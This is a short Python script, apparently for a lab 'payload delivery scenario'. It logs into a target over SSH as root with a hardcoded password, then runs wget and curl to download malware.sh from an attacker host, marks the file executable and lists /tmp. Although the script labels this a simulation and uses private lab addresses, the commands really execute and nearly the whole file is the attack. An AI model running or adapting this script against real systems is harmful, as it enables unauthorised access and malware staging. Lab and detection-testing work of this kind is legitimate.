import paramiko, time

TARGET_IP = "192.168.56.10"
ATTACKER_IP = "192.168.56.20"
USERNAME = "root"
PASSWORD = "password123"

PAYLOAD_COMMANDS = [
    "whoami",
    f"wget http://{ATTACKER_IP}:8080/malware.sh -O /tmp/malware.sh",
    f"curl -O http://{ATTACKER_IP}:8080/malware.sh",
    "chmod +x /tmp/malware.sh",
    "ls -la /tmp/",
]

print(f"[*] Connecting for payload delivery scenario")
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    ssh.connect(TARGET_IP, username=USERNAME, password=PASSWORD, timeout=5)
    print("[*] Connected. Simulating payload delivery...")
    for cmd in PAYLOAD_COMMANDS:
        stdin, stdout, stderr = ssh.exec_command(cmd)
        stdout.read()
        print(f"  $ {cmd}")
        time.sleep(1.5)
    ssh.close()
    print("[*] Payload scenario complete.")
except Exception as e:
    print(f"[!] Error: {e}")
